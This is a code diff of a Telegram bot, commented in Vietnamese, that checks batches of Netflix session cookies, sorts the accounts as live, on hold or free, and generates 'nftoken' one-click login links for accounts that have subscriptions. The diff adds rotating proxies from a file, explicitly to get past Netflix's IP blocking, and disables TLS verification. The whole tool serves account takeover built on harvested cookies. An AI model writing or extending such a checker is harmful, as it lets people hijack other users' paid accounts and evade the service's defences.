@@ -32,28 +32,57 @@ OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
 ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
 CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}
 
+def _build_proxy_dict(scheme, host, port, user=None, password=None):
+    host = host.strip()
+    if host.startswith("[") and host.endswith("]"): host = host[1:-1]
+    proxy_url = f"{scheme}://{user}:{password}@{host}:{port}" if user and password else f"{scheme}://{host}:{port}"
+    return {"http": proxy_url, "https": proxy_url}
+
+def _parse_proxy_line(line):
+    line = line.strip()
+    if not line or line.startswith("#"): return None
+    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
+    url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
+    if url_like:
+        d = url_like.groupdict()
+        return _build_proxy_dict(d["scheme"].lower(), d["host"], d["port"], d.get("user"), d.get("password"))
+    userpass_hostport = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
+    if userpass_hostport:
+        d = userpass_hostport.groupdict()
+        return _build_proxy_dict("http", d["host"], d["port"], d["user"], d["password"])
+    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
+    if hostport:
+        d = hostport.groupdict()
+        return _build_proxy_dict("http", d["host"], d["port"])
+    return None
+
+def load_proxies():
+    proxies = []
+    if os.path.exists("proxy.txt"):
+        with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                p = _parse_proxy_line(line)
+                if p: proxies.append(p)
+    return proxies
+
 def canonicalize_netflix_cookie_name(name):
     normalized = str(name or "").strip()
     return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)
 
 def is_netflix_domain(domain):
-    normalized = str(domain or "").strip()
-    if normalized.startswith("#HttpOnly_"):
-        normalized = normalized[len("#HttpOnly_"):]
-    return "netflix." in normalized.lower()
+    normalized = str(domain or "").strip().lower()
+    if normalized.startswith("#httponly_"): normalized = normalized[len("#httponly_"):]
+    return "netflix." in normalized
 
 def is_netflix_cookie_entry(domain, name):
     return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
 
 def split_netscape_cookie_columns(line):
     stripped = line.strip()
-    if not stripped or (stripped.startswith("#") and not stripped.startswith("#HttpOnly_")):
-        return []
-    if stripped.startswith("#HttpOnly_"):
-        stripped = stripped[len("#HttpOnly_"):]
+    if not stripped or (stripped.startswith("#") and not stripped.startswith("#HttpOnly_")): return []
+    if stripped.startswith("#HttpOnly_"): stripped = stripped[len("#HttpOnly_"):]
     parts = stripped.split("\t")
-    if len(parts) >= 7:
-        return parts[:6] + ["\t".join(parts[6:])]
+    if len(parts) >= 7: return parts[:6] + ["\t".join(parts[6:])]
     parts = re.split(r"\s+", stripped, maxsplit=6)
     return parts if len(parts) >= 7 else []
 
@@ -180,16 +209,12 @@ def extract_profile_names(text):
     return ", ".join(names) if names else None
 
 def extract_info(text):
-    # Hệ thống Regex nâng cao đồng bộ từ file gốc của bạn để không bỏ sót trạng thái gói
     membership_status = extract_first_match(text, [r'"membershipStatus"\s*:\s*"([^"]+)"', r'"membershipStatus":\s*"([^"]+)"'])
     localized_plan_name = extract_first_match(text, [r'"planName"\s*:\s*"([^"]+)"', r'"localizedPlanName"\s*:\s*"([^"]+)"', r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"'])
-    
-    # Nếu không tìm thấy tên gói bằng json, quét thô giao diện bằng tiếng Anh/Tây Ban Nha
     if not localized_plan_name:
         if "premium" in text.lower(): localized_plan_name = "Premium Plan"
         elif "standard" in text.lower(): localized_plan_name = "Standard Plan"
         elif "basic" in text.lower(): localized_plan_name = "Basic Plan"
-
     return {
         "email": extract_first_match(text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"']),
         "countryOfSignup": extract_first_match(text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"', r'"country"\s*:\s*"([^"]+)"']),
@@ -202,52 +227,32 @@ def extract_info(text):
 def is_subscribed_account(info, html_text=""):
     status = str(info.get("membershipStatus") or "").lower()
     plan = str(info.get("localizedPlanName") or "").lower()
-    
-    # Ép buộc nhận diện LIVE nếu tìm thấy từ khóa gói cước hoặc trạng thái thành viên hợp lệ
-    if "current_member" in status or "active" in status:
-        return True
-    if plan and not any(x in plan for x in ("free", "none", "null")):
-        return True
-    if "membership" in html_text.lower() and "sign out" in html_text.lower() and not "restart membership" in html_text.lower():
-        return True
+    if "current_member" in status or "active" in status: return True
+    if plan and not any(x in plan for x in ("free", "none", "null")): return True
+    if "membership" in html_text.lower() and "sign out" in html_text.lower() and not "restart membership" in html_text.lower(): return True
     return False
 
 def is_on_hold_account(info, html_text=""):
     status = str(info.get("membershipStatus") or "").lower()
-    if any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend")):
-        return True
-    if "account on hold" in html_text.lower() or "update payment" in html_text.lower():
-        return True
+    if any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend")): return True
+    if "account on hold" in html_text.lower() or "update payment" in html_text.lower(): return True
     return False
 
 def country_code_to_flag(code):
     raw = str(code or "").strip().upper()
-    if len(raw) == 2 and raw.isalpha():
-        return "".join(chr(127397 + ord(c)) for c in raw)
-    return "🌍"
+    return "".join(chr(127397 + ord(c)) for c in raw) if len(raw) == 2 and raw.isalpha() else "🌍"
 
-def create_nftoken(cookie_dict):
+# 🌐 PHẦN ĐÃ SỬA ĐỔI: ÉP BUỘC DÙNG PROXY SẠCH ĐỂ TẠO NFTOKEN TRÊN SERVER RENDER
+def create_nftoken(cookie_dict, proxy=None):
     netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
     if not netflix_id: return None
     url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-    params = {
-        "appVersion": "15.48.1",
-        "device_type": "NFAPPL-02-",
-        "idiom": "phone",
-        "path": '["account","token","default"]',
-        "responseFormat": "json"
-    }
-    headers = {
-        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
-        "Cookie": f"NetflixId={netflix_id}",
-        "x-netflix.argo.translated": "true"
-    }
+    params = {"appVersion": "15.48.1", "device_type": "NFAPPL-02-", "idiom": "phone", "path": '["account","token","default"]', "responseFormat": "json"}
+    headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={netflix_id}", "x-netflix.argo.translated": "true"}
     try:
-        r = requests.get(url, params=params, headers=headers, timeout=12, verify=False)
+        r = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=12, verify=False)
         if r.status_code == 200:
-            data = r.json()
-            # Đào sâu cấu trúc cây JSON để bóc tách token chuẩn xác
-            tk = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
+            tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
             if tk: return {"token": tk}
     except: pass
     return None
@@ -317,8 +322,9 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             bot.edit_message_text("❌ Không định dạng được cookie Netflix hợp lệ!", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())
             return
             
-        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản tiềm năng. Đang check dữ liệu...", progress_msg.chat.id, progress_msg.message_id)
+        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản tiềm năng. Đang check qua hệ thống mạng Proxy...", progress_msg.chat.id, progress_msg.message_id)
         
+        proxies = load_proxies()
         success_count = 0
         final_report = ""
         
@@ -329,14 +335,14 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
             session = requests.Session()
             session.cookies.update(cookies)
             
+            # Chọn proxy ngẫu nhiên từ file proxy.txt
+            proxy = random.choice(proxies) if proxies else None
+            
             try:
-                # Gửi request thẳng đến trang quản lý gói cước thành viên
-                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=12)
+                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, proxies=proxy, timeout=12)
                 
                 if r.status_code == 200 and r.text:
                     info = extract_info(r.text)
-                    
-                    # Xác định trạng thái tài khoản
                     is_subscribed = is_subscribed_account(info, r.text)
                     account_on_hold = is_subscribed and is_on_hold_account(info, r.text)
                     
@@ -344,17 +350,14 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     flag = country_code_to_flag(country)
                     plan_name = info.get("localizedPlanName") or "Gói hoạt động"
                     
-                    if account_on_hold:
-                        status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán / Gia hạn lỗi)"
-                    elif is_subscribed:
-                        status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt cước)"
-                    else:
-                        status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
+                    if account_on_hold: status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán)"
+                    elif is_subscribed: status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt cước)"
+                    else: status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
                     
-                    # 🌐 ĐOẠN ĐƯỢC FIX LẠI: TẠO NFTOKEN CHO TẤT CẢ TÀI KHOẢN ĐỦ ĐIỀU KIỆN LIVE/HOLD
                     nftoken_link_str = ""
                     if is_subscribed or account_on_hold:
-                        nftoken_data = create_nftoken(cookies)
+                        # Gửi kèm Proxy vào hàm sinh Token để Netflix không chặn IP của Render
+                        nftoken_data = create_nftoken(cookies, proxy=proxy)
                         if nftoken_data and nftoken_data.get("token"):
                             nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={nftoken_data['token']}"
                         else:
@@ -373,7 +376,7 @@ def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
                     continue
             except:
                 pass
-            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc bị Netflix chặn IP.\n\n"
+            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc bị lỗi cấu hình Proxy.\n\n"
 
         header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
         bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
@@ -389,8 +392,7 @@ def callback_restart(call):
 
 bot.set_my_commands([telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Hướng dẫn")])
 
-# Kích hoạt máy chủ web giả lập để tránh Render sleep
 threading.Thread(target=run_dummy_web_server, daemon=True).start()
 
-print("🤖 Bot Telegram đã sửa đổi bộ sinh NFToken thành công và đang khởi chạy...")
+print("🤖 Bot Telegram tích hợp Proxy vượt rào chặn đang khởi chạy...")
 bot.infinity_polling()
